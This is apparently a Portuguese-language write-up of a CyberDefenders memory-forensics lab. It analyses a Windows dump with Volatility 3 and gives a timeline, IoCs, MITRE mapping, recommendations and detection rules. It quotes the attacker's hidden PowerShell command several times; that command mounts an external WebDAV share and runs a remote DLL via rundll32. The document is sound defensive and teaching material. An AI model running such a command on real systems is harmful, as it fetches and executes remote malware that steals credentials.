# IR - Análise de Memória (Reveal Lab — Cyber Defenders)

## 1. Sumário executivo
**Contexto**  
Estação Windows com acesso a dados financeiros sinalizada pelo SIEM. Foi coletado um dump de memória para confirmar comprometimento e orientar contenção.

**Escopo**  
Identificar processos/linhas de comando, conexões externas, sinais de injeção/persistência e montar uma timeline do incidente.

**Achados-chave**  
- **LOLBAS confirmado**: `powershell.exe` (janela oculta) executa  
  `net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`  
  → **WebDAV externo** + **DLL remota** via `rundll32` (execução e evasão sem gravar em disco).
- **Rede externa**: `svchost.exe (PID 1260)` com **HTTP** para **`196.204.4.8:80`** (não interno) — requer enriquecimento.
- **Possível persistência**: criação de **Scheduled Task** `{ED77AEE0-EAFB-4133-B544-9E7C5632D902}` às 07:00:00 UTC.
- **Malfind**: sem evidência conclusiva de injeção nos PIDs principais nos trechos fornecidos (pode ter sido transitória).

---

## 2. Metodologia
**Ferramenta**: Volatility 3  
**Plugins utilizados**: `windows.info`, `pslist`, `pstree`, `netscan`, `dlllist`, `handles`, `malfind`, `timeliner`, `cmdline`

**Imagem analisada**  
- Lab: <https://cyberdefenders.org/blueteam-ctf-challenges/reveal/>  
- Caminho local: `raw_data/dfir/192-Reveal.dmp` (symlink para `/Users/ricardoalmeida/Downloads/CyberDefender/Reveal Lab/temp_extract_dir/192-Reveal.dmp`)

**Janela temporal observada (artefatos)**  
- **2024-07-04 10:44:50 UTC** — serviços base (`svchost.exe`) iniciam  
- **2024-07-04 10:45:14 UTC** — atividade `msedge.exe` (utility)  
- **2024-07-15 06:58–06:59 UTC** — conexões externas (`svchost.exe`)  
- **2024-07-15 07:00:00 UTC** — criação de Scheduled Task

---

## 3. Evidências principais — Análise
> Fontes: `reports/dfir/pslist.txt`, `pstree.txt`, `netscan.txt`, `malfind.txt`, `timeliner.txt`, `cmdline.txt`  
> Extracts: `reports/dfir/findings/*`

### 3.1 Processos e hierarquia (pslist / pstree)
- Múltiplos filhos de **`msedge.exe`** (PPID 5488) com `--type=renderer/utility`, compatível com navegação.  
- Cadeia de sistema em boot conforme esperado (`System`, `smss.exe`, `csrss.exe`, `wininit.exe`, etc.).  
- **Crítico**: presença de **`powershell.exe` (PID 3692)** com **cmdline maliciosa** e **`net.exe` (PID 2416)** para o mapeamento WebDAV.  
- `WWAHost.exe (PID 6780)` ativo em rede, sem IoC direto.

**Refs**: `reports/dfir/cmdline.txt`, `reports/dfir/findings/evidence_ps_tree.txt`.

### 3.2 Conexões de rede (netscan)
- Tráfego plausivelmente legítimo de componentes Microsoft (ex.: `smartscreen.exe`, `svchost.exe`→MS/Akamai).  
- **Sinal suspeito**: **`svchost.exe (PID 1260)` → `196.204.4.8:80`** (**HTTP** externo).  
- O endpoint **`45.9.74.32:8888`** (WebDAV) aparece na **cmdline**, mas não foi visto no recorte do `netscan` (sessão pode ter encerrado antes do dump).

**Refs**: `reports/dfir/findings/evidence_netscan_iocs.txt`, `reports/dfir/netscan.txt`.

### 3.3 DLLs / Handles (dlllist / handles)
- Para **`svchost.exe (PID 1260)`**, `dlllist` indica DLLs coerentes com **NetworkService** (nlasvc, dhcpcsvc, DNSAPI, WlanApi, mswsock, webio…).  
- Não há indicação, nos trechos vistos, de DLL dropada em diretórios de usuário/Temp para esse PID.

**Refs**: `reports/dfir/dlllist_pid1260.txt`, `reports/dfir/dlllist_all.txt`.

### 3.4 Injeções / regiões anômalas (malfind)
- Trechos fornecidos não mostram bloco atribuído diretamente a **3692/2416/1260**.  
- Dado o **LOLBAS via DLL remota**, a execução pode ter sido transitória ou fora do momento capturado.

**Conclusão da Seção 3**  
Comprometimento sustentado por **PowerShell oculto** + **WebDAV externo** + **`rundll32` carregando DLL remota**.  
`svchost (PID 1260)` → `196.204.4.8:80` permanece **sinal secundário** a enriquecer.

---

## 4. Timeline do incidente — Narrativa
1. **2024-07-04 10:44:50 UTC** — Iniciam `svchost.exe` de base (`timeliner`: PsList/Sessions).  
2. **2024-07-04 10:45:14 UTC** — `msedge.exe` (utility) ativo — navegação.  
3. **2024-07-15 06:58–06:59 UTC** — `svchost.exe` (PIDs 440/1260) estabelecem conexões externas (TLS e **HTTP** para **`196.204.4.8:80`**).  
4. **(sem timestamp no timeliner, mas claro em `cmdline`)** — **`powershell.exe (PID 3692)`** executa oculto:  
   `net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry` → **execução remota via WebDAV**.  
5. **2024-07-15 07:00:00 UTC** — Criação de **Scheduled Task** `{ED77AEE0-EAFB-4133-B544-9E7C5632D902}` (possível persistência).

**Leitura rápida (evidências)**  
- Cmdline/IoCs: `reports/dfir/findings/evidence_cmdline_iocs.txt`  
- Scheduled Task: `reports/dfir/findings/evidence_scheduled_task.txt`  
- Rede (IPs): `reports/dfir/findings/evidence_netscan_iocs.txt`

---

## 5. Recomendações
1. **Conter** o host afetado; **bloquear** `45.9.74.32:8888` e `196.204.4.8:80`.  
2. **Coletar** Event Logs (Security, PowerShell), Sysmon (se houver), definições da **Scheduled Task** citada, Amcache/Prefetch.  
3. **Threat hunt** por padrões: `rundll32` chamando caminhos UNC/WebDAV; `net use \\*davwwwroot*`; conexões para os IPs citados.  
4. **Hardening**: ASR Rules contra abuso de `rundll32`/WebDAV; **PowerShell Script Block Logging** + Constrained Language; **WDAC/AppLocker**.

---

## 6. Escopo & abordagem de revelação (resumo)
**Objetivo**: compreender natureza, sistemas afetados, cronologia e impacto para mitigar riscos e endereçar causa-raiz.  
**Âmbito**: alerta do SIEM em estação com dados financeiros; artefato: **dump de memória (~2 GB) de Windows 10**.  
**Ferramenta**: **Volatility 3** com arquitetura de **plugins** e **tabelas de símbolos** para interpretar estruturas do SO e extrair evidências.

---

## 7. Perfil do sistema (windows.info)
- **SO**: Windows 10  
- **NT root**: `C:\Windows`  
- **Timestamp de captura**: **2024-07-15 07:08:00 UTC**

---

## 8. Investigação guiada (P1–P7)

**P1 — Processo malicioso**  
`powershell.exe (PID 3692)` executando oculto → `net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`.

**P2 — PPID do processo malicioso**  
De acordo com a investigação: **PPID 4210** (pai possivelmente finalizado no momento do dump).

**P3–P5 — 2º estágio, diretório e MITRE**  
- 2º estágio: **`3435.dll`** (carregada remotamente)  
- Diretório remoto: **`\\45.9.74.32@8888\davwwwroot\`** (WebDAV)  
- MITRE ATT&CK: **T1218.011 — Signed Binary Proxy Execution: Rundll32**

**P6 — Usuário do processo malicioso**  
Usuário **`Elon`**, **SID** `S-1-5-21-3274565340-3808842250-3617890653-1001`; grupos incluem **Administrators** e **Domain Users**; integridade **High**.

**P7 — Família de malware (enriquecimento TI)**  
IP **45.9.74.32** sinalizado por **14/94** vendors (VirusTotal). Relações apontam para amostras compatíveis com **StrelaStealer** (roubo de credenciais de e-mail).

---

## 9. Mapeamento MITRE & IoCs

**Táticas/Técnicas**  
- **Defense Evasion / Execution** — **T1218.011** (*Rundll32*)  
- **Command and Control** — uso de **WebDAV/UNC** externo  
- **Persistence (a confirmar)** — **Scheduled Task** `{ED77AEE0-EAFB-4133-B544-9E7C5632D902}`

**Indicadores (IoCs)**

| Tipo | Valor | Observação |
|---|---|---|
| UNC / WebDAV | `\\45.9.74.32@8888\\davwwwroot\\` | Endpoint remoto usado no comando |
| IP | `45.9.74.32` | Relacionado no VT; artefatos associados |
| IP | `196.204.4.8:80` | Conexão HTTP por `svchost.exe (PID 1260)` |
| Arquivo (remoto) | `3435.dll` | Carregado via `rundll32` |
| Scheduled Task | `{ED77AEE0-EAFB-4133-B544-9E7C5632D902}` | Persistência provável |
| Usuário | `Elon` (`S-1-5-21-3274565340-3808842250-3617890653-1001`) | Execução com alto privilégio |

**Detecções sugeridas (SIGMA/Lógica)**  
- `process.name == "rundll32.exe"` **AND** `process.command_line CONTAINS "\\\\*davwwwroot*"`  
- `process.name == "powershell.exe"` **AND** (`command_line CONTAINS "-windowstyle hidden"` OR `command_line CONTAINS "net use \\\\"`)

